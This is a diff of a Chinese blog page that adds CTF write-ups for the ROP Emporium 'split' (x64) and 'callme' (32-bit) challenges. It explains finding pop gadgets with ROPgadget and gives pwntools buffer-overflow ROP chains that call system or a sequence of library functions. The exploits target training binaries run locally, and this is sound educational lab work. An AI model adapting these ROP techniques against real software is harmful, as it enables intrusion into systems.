@@ -37,8 +37,12 @@
 <meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240125195800302.png">
 <meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240125201753397.png">
 <meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240125201929639.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240128204219301.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240130200418169.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240130200659835.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240130201504791.png">
 <meta property="article:published_time" content="2024-01-22T12:15:26.092Z">
-<meta property="article:modified_time" content="2024-01-25T12:20:56.841Z">
+<meta property="article:modified_time" content="2024-01-30T12:17:38.621Z">
 <meta property="article:author" content="YY">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="ROPEmporium">
@@ -235,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          2.8k 字
         
       </span>
     
@@ -246,7 +250,7 @@
         
         
         
-          12 分钟
+          24 分钟
         
       </span>
     
@@ -341,11 +345,31 @@
 
 
 
+<h3 id="x64-1"><a href="#x64-1" class="headerlink" title="x64"></a>x64</h3><p>64位与32位最大的不同是传参，参数依次保存在rdi、rsi、rcx、rdx、r8、r9、栈，这里需要修改system的参数，那么就得将参数保存在rdi中，能够操作的只有栈，所以可以通过<code>pop rdi</code>操作，将栈中的内容保存在rdi中。</p>
+<p>这里使用ropgadget查找，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ROPgadget --binary ./split --only <span class="hljs-string">&quot;pop|ret&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240128204219301.png" srcset="/img/loading.gif" lazyload alt="image-20240128204219301"></p>
+<p>可以看到<code>0x4007c3</code>位置有符合条件的指令。</p>
+<blockquote>
+<p>为什么要<code>pop|ret</code>？因为只需要pop指令，执行完pop指令之后，希望继续执行到之前的位置，所以需要ret回来。</p>
+</blockquote>
+<p>这样就知道了四个重要的内容：溢出大小、gadget地址、目标字符串地址、system地址。首先是传溢出字符串，造成溢出，然后运行到gadget位置，将栈中字符串地址传给rdi、接着执行到system位置，得到flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./split&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span><br>payload += p64(<span class="hljs-number">0x00000000004007c3</span>)<br>payload += p64(<span class="hljs-number">0x0000000000601060</span>)<br>payload += p64(<span class="hljs-number">0x40074b</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 
 
+<h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><p>这道题主函数结构与之前类似，不过这里usefulFunction调用了几个callme函数，而且这几个函数在libcallme32.so中定义，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240130200418169.png" srcset="/img/loading.gif" lazyload alt="image-20240130200418169"></p>
+<p>分析这几个callme函数，发现callme_one函数是读取encrypted_flag.dat的内容，然后callme_two和callme_three函数用于解密，而且这三个函数结构类似都需要进行三个判断，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240130200659835.png" srcset="/img/loading.gif" lazyload alt="image-20240130200659835"></p>
+<p>首先需要进入callme_one函数中，绕过三个判断，执行完成之后，接着进入callme_two函数，最后进入callme_three函数。</p>
+<p>不过需要注意在usefulFunction函数中，每个callme函数之前，都需要push三个参数，但这三个参数是无效的，要绕过callme函数中的判断，需要输入特定的参数，那么为了保持栈平衡，需要pop三次，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20240130201504791.png" srcset="/img/loading.gif" lazyload alt="image-20240130201504791"></p>
+<p>所以最后可以这样写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./callme32&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">44</span><br><span class="hljs-comment"># callme_one</span><br>payload += p32(<span class="hljs-number">0x080484f0</span>)<br><span class="hljs-comment"># pop|pop|pop|ret</span><br>payload += p32(<span class="hljs-number">0x080487f9</span>)<br><span class="hljs-comment"># 参数</span><br>payload += p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xCAFEBABE</span>) + p32(<span class="hljs-number">0xD00DF00D</span>)<br><span class="hljs-comment"># callme_two</span><br>payload += p32(<span class="hljs-number">0x08048550</span>)<br>payload += p32(<span class="hljs-number">0x080487f9</span>)<br>payload += p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xCAFEBABE</span>) + p32(<span class="hljs-number">0xD00DF00D</span>)<br><span class="hljs-comment"># callme_three</span><br>payload += p32(<span class="hljs-number">0x080484e0</span>)<br>payload += p32(<span class="hljs-number">0x080487f9</span>)<br>payload += p32(<span class="hljs-number">0xDEADBEEF</span>) + p32(<span class="hljs-number">0xCAFEBABE</span>) + p32(<span class="hljs-number">0xD00DF00D</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
-<h3 id="x64-1"><a href="#x64-1" class="headerlink" title="x64"></a>x64</h3>
+
                 
               </div>
             
